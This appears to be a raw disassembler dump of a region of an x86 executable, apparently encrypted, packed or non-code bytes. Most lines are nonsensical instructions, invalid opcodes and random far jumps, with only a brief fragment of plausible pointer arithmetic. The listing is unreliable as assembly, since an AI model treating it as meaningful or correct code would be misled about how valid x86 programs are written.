  40f2ca:	xchg   esp,eax
  40f2cb:	pop    ss
  40f2cc:	push   0x31
  40f2ce:	hlt    
  40f2cf:	lea    ecx,[edx+0x65]
  40f2d2:	adc    BYTE PTR [esi+esi*8+0x7666c177],ch
  40f2d9:	push   ebp
  40f2da:	xlat   BYTE PTR ds:[ebx]
  40f2db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2dc:	sub    eax,0xaf678f18
  40f2e1:	xchg   ebx,eax
  40f2e2:	stc    
  40f2e3:	mov    edi,0x434cce0
  40f2e8:	pop    esi
  40f2e9:	xor    BYTE PTR [esi],0xae
  40f2ec:	push   edi
  40f2ed:	outs   dx,BYTE PTR ds:[esi]
  40f2ee:	sbb    eax,0x64653faf
  40f2f3:	or     cl,BYTE PTR [esi+0x21]
  40f2f6:	mov    eax,0x9637a8c
  40f2fb:	sub    ch,al
  40f2fd:	xchg   ebx,eax
  40f2fe:	add    BYTE PTR [edi+ebp*8],bh
  40f301:	in     al,0xed
  40f303:	sbb    DWORD PTR [esi-0x42],ebx
  40f306:	and    BYTE PTR [esi],cl
  40f308:	or     esi,DWORD PTR [edx+esi*1-0x5d]
  40f30c:	es in  eax,0xab
  40f30f:	lods   eax,DWORD PTR ds:[esi]
  40f310:	add    BYTE PTR [edx],bl
  40f312:	ss pop esi
  40f314:	scas   eax,DWORD PTR es:[edi]
  40f315:	data16 aas 
  40f317:	sub    al,0x25
  40f319:	pop    ss
  40f31a:	out    0x97,al
  40f31c:	add    DWORD PTR [ecx+0x4290a5ec],ebp
  40f322:	jns    0x40f2aa
  40f324:	cdq    
  40f325:	inc    esi
  40f326:	xchg   esi,eax
  40f327:	xchg   ecx,eax
  40f328:	dec    ebp
  40f329:	call   0x145f:0xf6f44ae7
  40f330:	dec    ebp
  40f331:	ins    DWORD PTR es:[edi],dx
  40f332:	ins    BYTE PTR es:[edi],dx
  40f333:	stos   DWORD PTR es:[edi],eax
  40f334:	jecxz  0x40f2c6
  40f336:	rdtsc  
  40f338:	mov    DWORD PTR ds:0x788f655c,esp
  40f33e:	es mov esp,0x9c1d9712
  40f344:	sub    al,0xa2
  40f346:	dec    ebp
  40f347:	pop    ebp
  40f348:	mov    WORD PTR [ebp-0xb9fd570],ds
  40f34e:	(bad)  
  40f34f:	je     0x40f305
  40f351:	aas    
  40f352:	out    0xf,eax
  40f354:	into   
  40f355:	int    0x3e
  40f357:	jp     0x40f3c4
  40f359:	pop    ebx
  40f35a:	test   DWORD PTR [edx],esi
  40f35c:	add    eax,0x3171160f
  40f361:	iret   
  40f362:	add    ch,BYTE PTR [ecx-0x61bacf1b]
  40f368:	iret   
  40f369:	mov    esp,0xaa41f675
  40f36e:	mov    al,ds:0x71775340
  40f373:	dec    ebx
  40f374:	call   0x3fe391f4
  40f379:	and    al,0xc6
  40f37b:	push   DWORD PTR [esi-0x415c4c42]
  40f381:	inc    ebx
  40f382:	sbb    al,0xc1
  40f384:	mov    ebx,0xb0fb3a68
  40f389:	das    
  40f38a:	into   
  40f38b:	jmp    0x40f34f
  40f38d:	push   edi
  40f38e:	adc    dl,BYTE PTR [edx-0x253d3d40]
  40f394:	pop    eax
  40f395:	cmp    dh,ah
  40f397:	dec    edi
  40f398:	and    BYTE PTR [esi-0x7c220a68],dl
  40f39e:	ja     0x40f3ab
  40f3a0:	jmp    0x40f352
  40f3a2:	cmp    esp,edx
  40f3a4:	xor    edi,DWORD PTR [edx+0x7f804b20]
  40f3aa:	loope  0x40f423
  40f3ac:	seta   BYTE PTR [ebx+0x2e0e2c98]
  40f3b3:	loop   0x40f3bd
  40f3b5:	lea    edx,[edx]
  40f3b7:	outs   dx,DWORD PTR ds:[esi]
  40f3b8:	mov    ds:0x9993e657,eax
  40f3bd:	push   0x44
  40f3bf:	fwait
  40f3c0:	jae    0x40f37b
  40f3c2:	scas   eax,DWORD PTR es:[edi]
  40f3c3:	cmp    ecx,ebx
  40f3c5:	pusha  
  40f3c6:	cs test al,0xcc
  40f3c9:	lahf   
  40f3ca:	xor    DWORD PTR [ecx-0x26245b56],ebx
  40f3d0:	sub    eax,0x9a1f09ec
  40f3d5:	imul   edx,DWORD PTR [esp+esi*8+0x1b061726],0xffffff8c
  40f3dd:	mov    edx,0x4c6dc9f1
  40f3e2:	mov    DWORD PTR [ebp-0xf],esp
  40f3e5:	xor    al,0x56
  40f3e7:	cdq    
  40f3e8:	or     BYTE PTR [ebx+0x7a],dl
  40f3eb:	ja     0x40f440
  40f3ed:	pop    edx
  40f3ee:	repz (bad) 
  40f3f0:	mov    ebx,0x46141a81
  40f3f5:	dec    ebp
  40f3f6:	add    eax,0x137d4e8c
  40f3fb:	pop    esp
  40f3fc:	push   esp
  40f3fd:	pop    edi
  40f3fe:	fadd   DWORD PTR [edi]
  40f400:	mov    ebp,0x5e8b2579
  40f405:	jo     0x40f44b
  40f407:	xchg   edx,eax
  40f408:	into   
  40f409:	clc    
  40f40a:	add    edx,esp
  40f40c:	pop    esp
  40f40d:	mov    edx,0xab1492fd
  40f412:	aam    0xe7
  40f414:	in     al,dx
  40f415:	iret   
  40f416:	dec    eax
  40f417:	and    DWORD PTR [edx+0x18144921],edi
  40f41d:	test   BYTE PTR [ecx-0x44fb7c45],al
  40f423:	call   DWORD PTR [ebx-0x4e]
  40f426:	sub    edi,eax
  40f428:	push   edx
  40f429:	cmp    eax,0xc4bbf7b0
  40f42e:	jns    0x40f491
  40f430:	push   ebp
  40f431:	outs   dx,BYTE PTR ds:[esi]
  40f432:	inc    ebx
  40f433:	mov    ds:0xf550340,al
  40f438:	inc    esp
  40f439:	add    ah,BYTE PTR [ecx-0x32278728]
  40f43f:	cmp    al,0x82
  40f441:	pusha  
  40f442:	push   ds
  40f443:	(bad)  
  40f445:	retf   0xcef2
  40f448:	jge    0x40f41f
  40f44a:	test   esi,0x18f90683
  40f450:	inc    esp
  40f451:	mov    edi,0x226b4a
  40f456:	add    al,0xc1
  40f458:	push   ebx
  40f459:	mov    ds:0x24157227,eax
  40f45e:	pop    esp
  40f45f:	dec    ecx
  40f460:	mov    WORD PTR [ebx-0x2e],ds
  40f463:	jae    0x40f4bc
  40f465:	fisttp QWORD PTR [edx+0x56942b74]
  40f46b:	into   
  40f46c:	cdq    
  40f46d:	inc    esi
  40f46e:	aam    0x9b
  40f470:	out    0x6c,al
  40f472:	call   0x716a:0x5e6ed4ba
  40f479:	dec    ebx
  40f47a:	dec    ebp
  40f47b:	ret    
  40f47c:	xchg   edx,eax
  40f47d:	xor    BYTE PTR ds:0xfeccc560,dh
  40f483:	and    al,0xc9
  40f485:	mul    WORD PTR [esi+0x152f354]
  40f48c:	adc    ebx,DWORD PTR ds:0x50f58f42
  40f492:	ins    BYTE PTR es:[edi],dx
  40f493:	pop    eax
  40f494:	mov    edx,DWORD PTR [edx]
  40f496:	mov    esi,DWORD PTR ds:0x421ce2
  40f49c:	add    DWORD PTR [edx],esi
  40f49e:	mov    esi,DWORD PTR [ebp+0x8]
  40f4a1:	mov    edx,DWORD PTR ds:0x421ce2
  40f4a7:	xor    esi,0x7510893
  40f4ad:	add    esi,0x3272db
  40f4b3:	jmp    0x411847
  40f4b8:	jae    0x40f43a
  40f4ba:	mov    ah,0xa9
  40f4bc:	xchg   ebx,eax
  40f4bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f4be:	jecxz  0x40f52c
  40f4c0:	pop    esi
  40f4c1:	sbb    ch,BYTE PTR [ebp-0x65]
  40f4c4:	or     eax,0x4b52a7bc
  40f4c9:	lea    esp,[edx+0x62]
  40f4cc:	jmp    0x40f52d
  40f4ce:	bound  esp,QWORD PTR [edx+0x68]
  40f4d1:	in     eax,0x3f
  40f4d3:	xchg   DWORD PTR [ecx-0x25],ecx
  40f4d6:	scas   eax,DWORD PTR es:[edi]
  40f4d7:	lods   al,BYTE PTR ds:[esi]
  40f4d8:	add    edi,DWORD PTR [edi]
  40f4da:	mov    al,ds:0x7f5169c4
  40f4df:	mov    ah,0xfa
  40f4e1:	mov    eax,0xbcbe680f
  40f4e6:	mov    edi,0xdd548058
  40f4eb:	mov    ds:0xc1bcbbc5,eax
  40f4f0:	test   DWORD PTR [edi],0xacf1e8b
  40f4f6:	sbb    eax,0xd5480cbd
  40f4fb:	add    dl,BYTE PTR [edx]
  40f4fd:	or     ch,BYTE PTR [esi-0x5]
  40f500:	fucom  st(6)
  40f502:	push   ds
  40f503:	inc    edi
  40f504:	mov    gs,WORD PTR [edx]
  40f506:	(bad)  
  40f507:	call   0x4f8ba70b
  40f50c:	adc    bh,BYTE PTR [ebx-0xb]
  40f50f:	mov    bl,0xa3
  40f511:	mov    ecx,0x475860e7
  40f516:	sub    al,0x84
  40f518:	loopne 0x40f579
  40f51a:	lea    edi,ds:0xe31bfdd1
  40f520:	xor    eax,0x4fe5049
  40f525:	jo     0x40f4f5
  40f527:	jne    0x40f4cc
  40f529:	push   edx
  40f52a:	pop    ecx
  40f52b:	add    dh,BYTE PTR [ecx]
  40f52d:	xchg   eax,ebx
  40f52f:	rcl    DWORD PTR [edx+0x27],cl
  40f532:	or     DWORD PTR [ecx+0x36],edi
  40f535:	loopne 0x40f5b4
  40f537:	mov    eax,eax
  40f539:	xor    dh,BYTE PTR [edi]
  40f53b:	pusha  
  40f53c:	loope  0x40f560
  40f53e:	jl     0x40f586
  40f540:	hlt    
  40f541:	aas    
  40f542:	mov    ecx,0xa2035db1
  40f547:	in     al,0x54
  40f549:	scas   eax,DWORD PTR es:[edi]
  40f54a:	adc    BYTE PTR [ebp-0x34],ah
  40f54d:	pushf  
  40f54e:	push   cs
  40f54f:	jl     0x40f4e1
  40f551:	xchg   BYTE PTR [edx-0x78],ah
  40f554:	(bad)  [ebp-0x2e1461b6]
  40f55a:	pop    edi
  40f55b:	loopne 0x40f59e
  40f55d:	xor    al,0xe2
  40f55f:	js     0x5775495
  40f565:	inc    eax
  40f566:	and    esp,DWORD PTR [ebp-0x6db750e5]
  40f56c:	idiv   BYTE PTR [esp+ebp*4+0x1897ad31]
  40f573:	jbe    0x40f509
  40f575:	into   
  40f576:	push   edx
  40f577:	not    WORD PTR ds:[eax+0x48365a48]
  40f57f:	fs jb  0x40f532
  40f582:	test   ebp,0x33361d02
  40f588:	and    ah,dl
  40f58a:	sti    
  40f58b:	pusha  
  40f58c:	mov    bh,0x4f
  40f58e:	das    
  40f58f:	jecxz  0x40f520
  40f591:	mov    dx,WORD PTR [eax-0x68]
  40f595:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f596:	aam    0x99
  40f598:	cmp    BYTE PTR [ebp-0x4f237607],ah
  40f59e:	aas    
  40f59f:	xchg   edi,eax
  40f5a0:	retf   0x7018
  40f5a3:	out    dx,eax
  40f5a4:	mov    BYTE PTR [eax+ecx*8-0x6f],ch
  40f5a8:	test   BYTE PTR [esi+0x4e79db],cl
  40f5ae:	xchg   esp,eax
  40f5af:	push   esi
  40f5b0:	and    eax,0x26ac4a81
  40f5b5:	xchg   edx,eax
  40f5b6:	or     edx,DWORD PTR [edx]
  40f5b8:	cmp    bl,ch
  40f5ba:	shl    BYTE PTR [eax+ebx*8],cl
  40f5bd:	std    
  40f5be:	adc    al,bl
  40f5c0:	cdq    
  40f5c1:	xor    al,0x83
  40f5c3:	(bad)
  40f5c7:	fwait
  40f5c8:	loop   0x40f639
  40f5ca:	inc    ebx
  40f5cb:	adc    cl,BYTE PTR [ecx+edx*4-0x1ba711f9]
  40f5d2:	ins    BYTE PTR es:[edi],dx
  40f5d3:	loopne 0x40f57a
  40f5d5:	mov    esp,0x618c63ca
  40f5da:	jmp    0x8b34:0x4c0af631
  40f5e1:	loop   0x40f56a
  40f5e3:	cmp    ecx,DWORD PTR [ecx+0x2a30dbec]
  40f5e9:	mov    ch,0xc9
  40f5eb:	mov    ds:0x32ec681e,al
  40f5f0:	push   edx
  40f5f1:	pop    ebx
  40f5f2:	xor    al,0xe1
  40f5f4:	xlat   BYTE PTR ds:[ebx]
  40f5f5:	jno    0x40f599
  40f5f7:	cli    
  40f5f8:	ins    BYTE PTR es:[edi],dx
  40f5f9:	xchg   ebp,eax
  40f5fa:	aad    0xb0
  40f5fc:	aaa    
  40f5fd:	jae    0x40f5dc
  40f5ff:	aam    0x68
  40f601:	and    eax,0x1658011
  40f606:	adc    ecx,esp
  40f608:	mov    bh,cl
  40f60a:	mov    ecx,0xcae1f1a8
  40f60f:	je     0x40f5df
  40f611:	cmc    
  40f612:	and    cl,BYTE PTR [eax]
  40f614:	les    edx,FWORD PTR [edi-0x133be69b]
  40f61a:	and    DWORD PTR [esi],esi
  40f61c:	call   0x316e1152
  40f621:	clc    
  40f622:	pop    ss
  40f623:	xor    esi,0x81c53aba
  40f629:	push   ebp
  40f62a:	fs dec esi
  40f62c:	xchg   edi,eax
  40f62d:	je     0x40f63e
  40f62f:	dec    ecx
  40f630:	mov    al,ds:0x788b42da
  40f635:	xor    esp,DWORD PTR [eax-0x5477ba0b]
  40f63b:	push   ss
  40f63c:	les    ebx,FWORD PTR [edi+0x4e3a7b0]
  40f642:	lods   al,BYTE PTR ds:[esi]
  40f643:	xchg   esi,eax
  40f644:	int3   
  40f645:	(bad)  
  40f646:	fs cmc 
  40f648:	loop   0x40f647
  40f64a:	stos   BYTE PTR es:[edi],al
  40f64b:	shl    eax,cl
  40f64d:	loopne 0x40f65b
  40f64f:	fs inc ebx
  40f651:	hlt    
  40f652:	inc    ebx
  40f653:	loopne 0x40f66f
  40f655:	fdivr  st,st(7)
  40f657:	clc    
  40f658:	loopne 0x40f6d4
  40f65a:	push   0xfffffffd
  40f65c:	push   cs
  40f65d:	loope  0x40f6bc
  40f65f:	and    eax,0x1985e588
  40f664:	sub    DWORD PTR [eax],esp
  40f666:	push   ds
  40f667:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f668:	push   cs
  40f669:	mov    al,0x8e
  40f66b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f66c:	rcl    BYTE PTR [ecx],cl
  40f66e:	pop    ebp
  40f66f:	out    dx,eax
  40f670:	shl    BYTE PTR [ebp-0x40],1
  40f673:	xchg   edi,eax
  40f674:	mov    dl,0xce
  40f676:	mov    ah,0xf
  40f678:	jp     0x40f6c8
  40f67a:	rcl    BYTE PTR [ebp+0x49],1
  40f67d:	out    0xdd,eax
  40f67f:	jo     0x40f6b6
  40f681:	adc    dh,BYTE PTR [esi]
  40f683:	test   al,0xb9
  40f685:	and    al,dh
  40f687:	and    BYTE PTR [eax],ah
  40f689:	dec    ebx
  40f68a:	xor    ebx,edi
  40f68c:	or     BYTE PTR [edx],dl
  40f68e:	in     al,0xea
  40f690:	add    ebx,edi
  40f692:	data16 icebp 
  40f694:	adc    ebp,ecx
  40f696:	and    eax,ebp
  40f698:	cmc    
  40f699:	push   ebx
  40f69a:	cmp    DWORD PTR [eax-0x20],ebp
  40f69d:	outs   dx,BYTE PTR ds:[esi]
  40f69e:	pop    es
  40f69f:	cmp    esi,esp
  40f6a1:	outs   dx,DWORD PTR ds:[esi]
  40f6a2:	daa    
  40f6a3:	ja     0x40f6a5
  40f6a5:	leave  
  40f6a6:	sbb    al,0x0
  40f6a8:	cmp    cl,dh
  40f6aa:	mov    cl,0x88
  40f6ac:	push   0x29
  40f6ae:	ins    DWORD PTR es:[edi],dx
  40f6af:	sbb    dl,BYTE PTR ds:0x7dfe24ef
  40f6b5:	repnz test DWORD PTR [ebp-0x1cf06dae],ebp
  40f6bc:	sbb    eax,0x7cbfc37d
  40f6c1:	addr16 xchg ebx,eax
  40f6c3:	pop    eax
  40f6c4:	sub    al,0xd2
  40f6c6:	xchg   ebp,eax
  40f6c7:	adc    DWORD PTR [edi+0x1e],ebx
  40f6ca:	mov    DWORD PTR [eax],eax
  40f6cc:	jbe    0x40f730
  40f6ce:	fisttp QWORD PTR [eax-0x7675f0b]
  40f6d4:	mov    al,ds:0xdbfd6f12
  40f6d9:	sub    esi,DWORD PTR [edx]
  40f6db:	dec    ecx
  40f6dc:	inc    esp
  40f6dd:	adc    ebx,DWORD PTR [esi]
  40f6df:	repz xchg ebx,eax
  40f6e1:	add    ah,BYTE PTR [esi+eax*8]
  40f6e4:	and    eax,0x24e3e6ee
  40f6e9:	mov    esi,0x345979e1
  40f6ee:	pusha  
  40f6ef:	repz cmc 
  40f6f1:	xchg   edx,eax
  40f6f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6f3:	stos   DWORD PTR es:[edi],eax
  40f6f4:	outs   dx,DWORD PTR ds:[esi]
  40f6f5:	add    eax,esp
  40f6f7:	jg     0x40f68a
  40f6f9:	cmp    eax,0x5f2aeb41
  40f6fe:	jp     0x40f770
  40f700:	icebp  
  40f701:	cmp    al,0x35
  40f703:	popf   
  40f704:	shl    ebx,1
  40f706:	cli    
  40f707:	repz test DWORD PTR [esi+0x52],0xd272a3e0
  40f70f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f710:	into   
  40f711:	loopne 0x40f699
  40f713:	mov    bl,0x6c
  40f715:	push   ss
  40f716:	xor    al,0xa8
  40f718:	inc    ebx
  40f719:	enter  0x8269,0xd1
  40f71d:	push   esp
  40f71e:	xor    eax,0x88995a36
  40f723:	cmp    cl,bl
  40f725:	daa    
  40f726:	js     0x40f780
  40f728:	stc    
  40f729:	in     al,dx
  40f72a:	add    DWORD PTR [edx+0x78b3cd93],ebx
  40f730:	push   ds
  40f731:	pop    ds
  40f732:	scas   eax,DWORD PTR es:[edi]
  40f733:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f734:	xor    bl,dl
  40f736:	and    ebp,0x3e
  40f739:	jp     0x40f730
  40f73b:	or     al,0xa5
  40f73d:	push   0x995e7ca0
  40f742:	cmp    BYTE PTR [esi+0x2deb4f51],cl
  40f748:	add    al,0x3f
  40f74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f74b:	push   edi
  40f74c:	ins    DWORD PTR es:[edi],dx
  40f74d:	outs   dx,DWORD PTR ds:[esi]
  40f74e:	dec    edi
  40f74f:	mov    al,ds:0x6add9710
  40f754:	add    DWORD PTR [edi-0x78386fc3],eax
  40f75a:	int3   
  40f75b:	inc    ebp
  40f75c:	jg     0x40f7b9
  40f75e:	mov    al,ds:0x70afb0f2
  40f763:	setne  BYTE PTR [eax-0x3b]
  40f767:	mov    ch,0xfe
  40f769:	pop    ebp
  40f76a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f76b:	cmp    WORD PTR [ebx+0x18],0xff87
  40f770:	mov    ds:0x18231254,al
  40f775:	dec    ecx
  40f776:	pop    esp
  40f777:	scas   al,BYTE PTR es:[edi]
  40f778:	movd   esi,mm2
  40f77b:	xor    eax,0x5c5fb4ac
  40f780:	push   0xd0409c9e
  40f785:	popf   
  40f786:	dec    edx
  40f787:	sbb    eax,0xaa0d7d22
  40f78c:	aaa    
  40f78d:	repnz sub BYTE PTR [esi-0x56],ch
  40f791:	xchg   ebp,eax
  40f792:	and    eax,esp
  40f794:	int    0xea
  40f796:	fiadd  DWORD PTR [esi+0xf4bab2e]
  40f79c:	mov    al,0xb9
  40f79e:	pop    edi
  40f79f:	xor    eax,0xa643f794
  40f7a4:	pop    es
  40f7a5:	sub    ecx,DWORD PTR cs:[esi+0x3852daa]
  40f7ac:	repz pop eax
  40f7ae:	add    eax,0x66ca3bc7
  40f7b3:	test   BYTE PTR [edi-0x632f11c4],0x8b
  40f7ba:	loop   0x40f772
  40f7bc:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40f7be:	mov    ds:0xf7abc78d,al
  40f7c3:	loop   0x40f7e0
  40f7c5:	mov    ch,BYTE PTR [esi]
  40f7c7:	cli    
  40f7c8:	ja     0x40f76f
  40f7ca:	pop    esi
  40f7cb:	cmp    ch,BYTE PTR [edi+0x185f3f8a]
  40f7d1:	adc    ecx,eax
  40f7d3:	pop    ss
  40f7d4:	leave  
  40f7d5:	imul   ebx,ecx,0xd3f1a2c4
  40f7db:	(bad)  
  40f7dc:	(bad)  
  40f7dd:	es pusha 
  40f7df:	xchg   esp,eax
  40f7e0:	retf   0xfad6
  40f7e3:	xbegin 0xac024fd7
  40f7e9:	mov    ch,0x11
  40f7eb:	int3   
  40f7ec:	mov    esp,0x44f62885
  40f7f1:	mov    WORD PTR [ebx+0x4210228],fs
  40f7f7:	sbb    ah,BYTE PTR [edi]
  40f7f9:	adc    eax,eax
  40f7fb:	aas    
  40f7fc:	ffreep st(1)
  40f7fe:	sub    dh,BYTE PTR [eax]
  40f800:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f801:	jmp    0xc0df:0xb36a05cb
  40f808:	or     ecx,DWORD PTR [ebp-0x24]
  40f80b:	mov    ah,0x26
  40f80d:	shl    DWORD PTR [ecx],1
  40f80f:	cmp    ecx,DWORD PTR [esi+0x2d]
  40f812:	in     al,0x81
  40f814:	mov    ds:0xb93dc74b,eax
  40f819:	inc    esi
  40f81a:	cdq    
  40f81b:	cmc    
  40f81c:	or     al,0xe2
  40f81e:	pop    esp
  40f81f:	and    eax,DWORD PTR [ebx-0xa]
  40f822:	cmp    DWORD PTR [edi+0x67],ecx
  40f825:	jg     0x40f890
  40f827:	add    BYTE PTR [ebp-0x75],bh
  40f82a:	(bad)  
  40f82b:	lea    eax,[ecx+esi*4+0x3c08d2ec]
  40f832:	mov    fs:0xaf183b1a,al
  40f838:	lock mov ds:0xc86bef45,al
  40f83e:	sbb    eax,0x6a9ff070
  40f843:	imul   edx,DWORD PTR [eax-0x3e],0x35573b19
  40f84a:	mov    ah,0xcb
  40f84c:	cmp    DWORD PTR [esi],ebx
  40f84e:	cmp    al,BYTE PTR [edi+0x15]
  40f851:	mov    esi,0x8cdfd81d
  40f856:	fadd   QWORD PTR [edx-0x4f]
  40f859:	xor    eax,eax
  40f85b:	pop    ds
  40f85c:	in     al,dx
  40f85d:	out    dx,al
  40f85e:	and    al,0x7a
  40f860:	daa    
  40f861:	mov    eax,ds:0x924cf4f0
  40f866:	outs   dx,DWORD PTR ds:[esi]
  40f867:	adc    ecx,ebp
  40f869:	les    ecx,FWORD PTR [edi]
  40f86b:	pop    edi
  40f86c:	in     al,0x58
  40f86e:	sar    BYTE PTR [esi+0x58e7b8f6],0x39
  40f875:	sti    
  40f876:	arpl   WORD PTR [eax+ebx*2-0x2d],bp
  40f87a:	pop    ebp
  40f87b:	pushf  
  40f87c:	cmp    edi,DWORD PTR [esi-0x70]
  40f87f:	scas   eax,DWORD PTR es:[edi]
  40f880:	push   edi
  40f881:	cmc    
  40f882:	dec    edi
  40f883:	inc    ebx
  40f884:	int    0x12
  40f886:	fisttp QWORD PTR [ebx+eax*1]
  40f889:	xlat   BYTE PTR ds:[ebx]
  40f88a:	call   0x21188666
  40f88f:	xlat   BYTE PTR ds:[ebx]
  40f890:	push   ss
  40f891:	nop
  40f892:	cdq    
  40f893:	push   ebx
  40f894:	push   ss
  40f895:	fnstenv [ebx+ebp*2-0x45]
  40f899:	xchg   DWORD PTR [edi+edi*1],ebx
  40f89c:	or     esi,ecx
  40f89e:	sbb    BYTE PTR [edi+0x14],al
  40f8a1:	adc    eax,0xe6b0aea2
  40f8a6:	(bad)  [esi]
  40f8a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f8a9:	retf   0x7dbc
  40f8ac:	xlat   BYTE PTR ds:[ebx]
  40f8ad:	jno    0x40f8e3
  40f8af:	dec    edx
  40f8b0:	in     eax,0x11
  40f8b2:	call   0xead7:0x62f7c821
  40f8b9:	gs retf 
  40f8bb:	push   0x1137bda4
  40f8c0:	xlat   BYTE PTR ds:[ebx]
  40f8c1:	mov    esi,0x69fbfb0c
  40f8c6:	lods   al,BYTE PTR ds:[esi]
  40f8c7:	jns    0x40f852
  40f8c9:	sbb    eax,0xa69944a0
  40f8ce:	ja     0x40f92a
  40f8d0:	mov    ch,0xc3
  40f8d2:	push   esp
  40f8d3:	out    0xf5,al
  40f8d5:	pop    ebp
  40f8d6:	dec    eax
  40f8d7:	jp     0x40f93b
  40f8d9:	dec    ebx
  40f8da:	repz push ds
  40f8dc:	test   ebx,0x902a2ace
  40f8e2:	inc    eax
  40f8e3:	sbb    ecx,DWORD PTR [edi+0x7c]
  40f8e6:	std    
  40f8e7:	cmp    edi,DWORD PTR [esi]
  40f8e9:	pushf  
  40f8ea:	pop    ebx
  40f8eb:	jne    0x40f8bb
  40f8ed:	sub    al,0xe7
  40f8ef:	fs mov ah,0x8d
  40f8f2:	loop   0x40f92f
  40f8f4:	and    esi,DWORD PTR [esi+ecx*4+0x7495dc46]
  40f8fb:	inc    ebp
  40f8fc:	fdivr  QWORD PTR [eax+edi*1+0x55]
  40f900:	add    al,0xa8
  40f902:	fs push edi
  40f904:	mov    esi,0x6a5640e0
  40f909:	aam    0xf3
  40f90b:	fwait
  40f90c:	push   ss
  40f90d:	pop    ebx
  40f90e:	pop    ebp
  40f90f:	(bad)  
  40f910:	aad    0xec
  40f912:	cmp    DWORD PTR [ecx-0x2f164b85],esi
  40f918:	fwait
  40f919:	sub    al,0xc0
  40f91b:	mov    ch,BYTE PTR [edx+0x35]
  40f91e:	(bad)  
  40f91f:	xchg   edi,eax
  40f920:	push   eax
  40f921:	mov    ds:0x53b72d16,eax
  40f926:	cmp    edx,DWORD PTR [esp+eax*1+0x1d367f4d]
  40f92d:	lds    eax,FWORD PTR [ebx-0x1683b6c1]
  40f933:	inc    DWORD PTR [edi+0x294c61f4]
  40f939:	pushf  
  40f93a:	xor    eax,0x340b4561
  40f93f:	mov    eax,0xc1b405f0
  40f944:	add    BYTE PTR [eax+0x79],bh
  40f947:	test   al,0x7e
  40f949:	ror    DWORD PTR [eax],1
  40f94b:	adc    al,0xd8
  40f94d:	in     al,dx
  40f94e:	test   BYTE PTR [edx-0x79],0xbd
  40f952:	mov    dl,0x50
  40f954:	cld    
  40f955:	jg     0x40f9be
  40f957:	into   
  40f958:	mov    DWORD PTR [edx],ecx
  40f95a:	in     eax,0x99
  40f95c:	sbb    DWORD PTR gs:[esi+esi*8-0x57],ecx
  40f961:	fst    DWORD PTR [ecx]
  40f963:	and    BYTE PTR ds:0xa4b70ce2,bh
  40f969:	push   0xd408b9af
  40f96e:	(bad)  
  40f96f:	shr    DWORD PTR [esi],cl
  40f971:	pop    esi
  40f972:	push   esp
  40f973:	add    eax,0xf3122d71
  40f978:	imul   ecx,DWORD PTR [ebx],0xa8298c5b
  40f97e:	cs je  0x40f9cc
  40f981:	jbe    0x40f9d1
  40f983:	ins    BYTE PTR es:[edi],dx
  40f984:	push   ds
  40f985:	daa    
  40f986:	pop    es
  40f987:	jb     0x40f944
  40f989:	test   al,0xc1
  40f98b:	xchg   DWORD PTR [edx-0x6771578],ecx
  40f991:	cli    
  40f992:	jbe    0x40f993
  40f994:	ss in  eax,0xc8
  40f997:	cdq    
  40f998:	outs   dx,DWORD PTR ds:[esi]
  40f999:	test   BYTE PTR [edx+0x28],al
  40f99c:	loop   0x40f924
  40f99e:	(bad)  
  40f9a0:	scas   eax,DWORD PTR es:[edi]
  40f9a1:	jp     0x40f986
  40f9a3:	addr16 jne 0x40f97f
  40f9a6:	ins    DWORD PTR es:[edi],dx
  40f9a7:	pop    ss
  40f9a8:	pop    eax
  40f9a9:	push   cs
  40f9aa:	das    
  40f9ab:	out    0x94,al
  40f9ad:	inc    eax
  40f9ae:	aas    
  40f9af:	hlt    
  40f9b0:	inc    eax
  40f9b1:	jmp    0x6afb0f56
  40f9b6:	stc    
  40f9b7:	mov    bl,bl
  40f9b9:	pop    ebp
  40f9ba:	js     0x40f9db
  40f9bc:	push   esp
  40f9bd:	call   0xed56:0x877ac0f4
  40f9c4:	std    
  40f9c5:	adc    bh,cl
  40f9c7:	or     BYTE PTR [ebx+edx*2],bl
  40f9ca:	cld    
  40f9cb:	xchg   esp,eax
  40f9cc:	(bad)  
  40f9cd:	push   0x42
  40f9cf:	into   
  40f9d0:	pop    edi
  40f9d1:	mov    esp,eax
  40f9d3:	jo     0x40f97b
  40f9d5:	(bad)  
  40f9d6:	ss and dh,al
  40f9d9:	pop    es
  40f9da:	mov    ecx,0x5c88317f
  40f9df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e0:	push   ebx
  40f9e1:	sbb    esi,DWORD PTR [edx+0x69159359]
  40f9e7:	sbb    BYTE PTR [ebp-0x71186f3e],0xc
  40f9ee:	or     al,0x43
  40f9f0:	jecxz  0x40f9b1
  40f9f2:	mov    cl,0xd1
  40f9f4:	hlt    
  40f9f5:	aas    
  40f9f6:	neg    BYTE PTR [edi+0xc]
  40f9f9:	pop    esi
  40f9fa:	aas    
  40f9fb:	jp     0x40f997
  40f9fd:	or     BYTE PTR [edi-0x7a1750a9],dl
  40fa03:	jmp    FWORD PTR [edi+0x683e6256]
  40fa09:	in     al,0xdd
  40fa0b:	pusha  
  40fa0c:	ins    DWORD PTR es:[edi],dx
  40fa0d:	xor    BYTE PTR [eax+eax*1+0x74],0x3b
  40fa12:	mov    dl,0xbc
  40fa14:	mov    dl,0x8d
  40fa16:	in     eax,dx
  40fa17:	or     eax,edi
  40fa19:	push   edi
  40fa1a:	test   al,0x55
  40fa1c:	sbb    eax,0x17adf019
  40fa21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fa22:	inc    eax
  40fa23:	pop    edi
  40fa24:	adc    cl,ch
  40fa26:	pop    edi
  40fa27:	jns    0x40fa3a
  40fa29:	outs   dx,DWORD PTR ds:[esi]
  40fa2a:	leave  
  40fa2b:	shl    BYTE PTR [edx],cl
  40fa2d:	in     al,0x11
